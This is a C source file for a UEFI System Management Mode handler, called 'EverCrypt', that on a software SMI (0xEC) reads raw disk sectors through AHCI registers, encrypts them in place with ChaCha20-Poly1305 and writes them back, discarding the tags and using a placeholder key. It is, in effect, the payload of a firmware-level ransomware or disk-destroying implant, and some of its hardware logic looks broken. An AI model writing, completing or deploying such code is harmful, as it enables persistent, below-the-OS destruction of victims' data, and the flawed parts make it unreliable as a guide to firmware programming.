/** @file
  EverCrypt SMM Handler - Ring -2 Encryption Engine
  
  NOW USES CHACHA20-POLY1305 INSTEAD OF XOR
**/

#include <PiSmm.h>
#include <Library/SmmServicesTableLib.h>
#include <Library/BaseMemoryLib.h>
#include <Library/DebugLib.h>
#include <Library/IoLib.h>
#include <Library/SynchronizationLib.h>
#include <Library/BaseLib.h>
#include <Protocol/SmmSwDispatch2.h>

#include "../Include/EverCryptProto.h"
#include "../CryptoEngine/chacha20.h"

//
// Global Variables
//
STATIC UINT8      mEncryptionKey[CHACHA_KEY_SIZE];
STATIC UINT8      mNonce[CHACHA_NONCE_SIZE];
STATIC BOOLEAN    mEncryptionActive = FALSE;
STATIC SPIN_LOCK  mSmmLock;

//
// AHCI definitions
//
#define AHCI_BASE_ADDR        0xF7E00000
#define AHCI_PORT0_CLB        (AHCI_BASE_ADDR + 0x100)
#define AHCI_PORT0_FB         (AHCI_BASE_ADDR + 0x108)

#pragma pack(1)

typedef struct {
  UINT32  CommandListBaseL;
  UINT32  CommandListBaseH;
  UINT32  FisBaseL;
  UINT32  FisBaseH;
  UINT32  InterruptStatus;
  UINT32  InterruptEnable;
  UINT32  Command;
  UINT32  Reserved;
  UINT32  TaskFileData;
  UINT32  Signature;
  UINT32  SataStatus;
  UINT32  SataControl;
  UINT32  SataError;
  UINT32  SataActive;
  UINT32  CommandIssue;
} AHCI_PORT_REGS;

typedef struct {
  UINT8   CmdFisType;
  UINT8   Flags;
  UINT8   Command;
  UINT8   Features;
  UINT8   LbaLow;
  UINT8   LbaMid;
  UINT8   LbaHigh;
  UINT8   Device;
  UINT8   LbaLowExp;
  UINT8   LbaMidExp;
  UINT8   LbaHighExp;
  UINT8   FeaturesExp;
  UINT8   SectorCount;
  UINT8   SectorCountExp;
  UINT8   Reserved1;
  UINT8   Control;
  UINT32  Reserved2;
} ATA_COMMAND_FIS;

#pragma pack()

STATIC
VOID
LocalCpuPause (
  VOID
  )
{
  __asm__ __volatile__ ("pause" ::: "memory");
}

EFI_STATUS
SmmReadSector (
  IN  UINT64  Lba,
  OUT UINT8   *Buffer
  )
{
  volatile AHCI_PORT_REGS  *Port;
  ATA_COMMAND_FIS          Fis;
  
  Port = (volatile AHCI_PORT_REGS *)AHCI_PORT0_CLB;
  
  ZeroMem(&Fis, sizeof(Fis));
  Fis.CmdFisType   = 0x27;
  Fis.Flags        = 0x80;
  Fis.Command      = 0x25;
  Fis.LbaLow       = (UINT8)(Lba & 0xFF);
  Fis.LbaMid       = (UINT8)((Lba >> 8) & 0xFF);
  Fis.LbaHigh      = (UINT8)((Lba >> 16) & 0xFF);
  Fis.LbaLowExp    = (UINT8)((Lba >> 24) & 0xFF);
  Fis.LbaMidExp    = (UINT8)((Lba >> 32) & 0xFF);
  Fis.LbaHighExp   = (UINT8)((Lba >> 40) & 0xFF);
  Fis.Device       = 0x40;
  Fis.SectorCount  = 1;
  
  CopyMem((VOID *)(UINTN)AHCI_PORT0_FB, &Fis, sizeof(Fis));
  MmioWrite32((UINTN)&Port->CommandIssue, 0x01);
  
  while (MmioRead32((UINTN)&Port->CommandIssue) & 0x01) {
    LocalCpuPause();
  }
  
  CopyMem(Buffer, (VOID *)(UINTN)(AHCI_PORT0_FB + 0x40), 512);
  
  return EFI_SUCCESS;
}

EFI_STATUS
SmmWriteSector (
  IN UINT64  Lba,
  IN UINT8   *Buffer
  )
{
  volatile AHCI_PORT_REGS  *Port;
  ATA_COMMAND_FIS          Fis;
  
  Port = (volatile AHCI_PORT_REGS *)AHCI_PORT0_CLB;
  
  ZeroMem(&Fis, sizeof(Fis));
  Fis.CmdFisType   = 0x27;
  Fis.Flags        = 0x80;
  Fis.Command      = 0x35;
  Fis.LbaLow       = (UINT8)(Lba & 0xFF);
  Fis.LbaMid       = (UINT8)((Lba >> 8) & 0xFF);
  Fis.LbaHigh      = (UINT8)((Lba >> 16) & 0xFF);
  Fis.LbaLowExp    = (UINT8)((Lba >> 24) & 0xFF);
  Fis.LbaMidExp    = (UINT8)((Lba >> 32) & 0xFF);
  Fis.LbaHighExp   = (UINT8)((Lba >> 40) & 0xFF);
  Fis.Device       = 0x40;
  Fis.SectorCount  = 1;
  
  CopyMem((VOID *)(UINTN)(AHCI_PORT0_FB + 0x40), Buffer, 512);
  CopyMem((VOID *)(UINTN)AHCI_PORT0_FB, &Fis, sizeof(Fis));
  MmioWrite32((UINTN)&Port->CommandIssue, 0x01);
  
  while (MmioRead32((UINTN)&Port->CommandIssue) & 0x01) {
    LocalCpuPause();
  }
  
  return EFI_SUCCESS;
}

/**
  Encrypt single sector using ChaCha20-Poly1305
  
  NOW USING REAL CRYPTOGRAPHY!
**/
VOID
EncryptSector (
  IN  UINT8  *PlainSector,
  OUT UINT8  *CipherSector,
  OUT UINT8  *Tag
  )
{
  // Increment nonce for each sector (ensures unique keystream)
  (*(UINT64 *)mNonce)++;
  
  // Use ChaCha20-Poly1305 AEAD
  ChaCha20Poly1305Encrypt(
    mEncryptionKey,
    mNonce,
    PlainSector,
    512,
    CipherSector,
    Tag
  );
}

EFI_STATUS
EncryptDiskRange (
  IN UINT64  StartLba,
  IN UINT64  EndLba
  )
{
  UINT64      CurrentLba;
  UINT8       PlainSector[512];
  UINT8       CipherSector[512];
  UINT8       Tag[16];
  
  DEBUG((DEBUG_INFO, "[SMM] Encrypting LBA %lld to %lld (ChaCha20)\n", StartLba, EndLba));
  
  for (CurrentLba = StartLba; CurrentLba <= EndLba; CurrentLba++) {
    SmmReadSector(CurrentLba, PlainSector);
    EncryptSector(PlainSector, CipherSector, Tag);
    SmmWriteSector(CurrentLba, CipherSector);
    
    if ((CurrentLba % 1000) == 0) {
      DEBUG((DEBUG_INFO, "[SMM] Progress: %lld sectors\n", CurrentLba - StartLba));
    }
  }
  
  DEBUG((DEBUG_INFO, "[SMM] Encryption complete\n"));
  
  return EFI_SUCCESS;
}

EFI_STATUS
EFIAPI
SoftwareSmiHandler (
  IN EFI_HANDLE  DispatchHandle,
  IN CONST VOID  *Context         OPTIONAL,
  IN OUT VOID    *CommBuffer      OPTIONAL,
  IN OUT UINTN   *CommBufferSize  OPTIONAL
  )
{
  DEBUG((DEBUG_INFO, "[SMM] Software SMI triggered\n"));
  
  if (IoRead8(0xB2) == 0xEC) {
    if (!mEncryptionActive) {
      DEBUG((DEBUG_INFO, "[SMM] Starting ChaCha20 encryption via SMI\n"));
      mEncryptionActive = TRUE;
      EncryptDiskRange(0, 0x1000);
      mEncryptionActive = FALSE;
    }
  }
  
  return EFI_SUCCESS;
}

EFI_STATUS
EFIAPI
EverCryptSmmEntry (
  IN EFI_HANDLE        ImageHandle,
  IN EFI_SYSTEM_TABLE  *SystemTable
  )
{
  EFI_STATUS                      Status;
  EFI_SMM_SW_DISPATCH2_PROTOCOL   *SwDispatch;
  EFI_SMM_SW_REGISTER_CONTEXT     SwContext;
  EFI_HANDLE                      SwHandle;
  
  DEBUG((DEBUG_INFO, "[EverCrypt] SMM Handler loading (ChaCha20 Edition)...\n"));
  
  InitializeSpinLock(&mSmmLock);
  
  // Initialize crypto material (demo key - replace with derived key)
  SetMem(mEncryptionKey, CHACHA_KEY_SIZE, 0xAA);
  ZeroMem(mNonce, CHACHA_NONCE_SIZE);
  
  Status = gSmst->SmmLocateProtocol(
                    &gEfiSmmSwDispatch2ProtocolGuid,
                    NULL,
                    (VOID **)&SwDispatch
                    );
  if (!EFI_ERROR(Status)) {
    SwContext.SwSmiInputValue = 0xEC;
    
    Status = SwDispatch->Register(
                          SwDispatch,
                          SoftwareSmiHandler,
                          &SwContext,
                          &SwHandle
                          );
    if (EFI_ERROR(Status)) {
      DEBUG((DEBUG_ERROR, "[SMM] SW SMI register failed: %r\n", Status));
    } else {
      DEBUG((DEBUG_INFO, "[SMM] SW SMI handler registered (0xEC)\n"));
    }
  }
  
  DEBUG((DEBUG_INFO, "[EverCrypt] Ring -2 SMM active with ChaCha20-Poly1305\n"));
  
  return EFI_SUCCESS;
}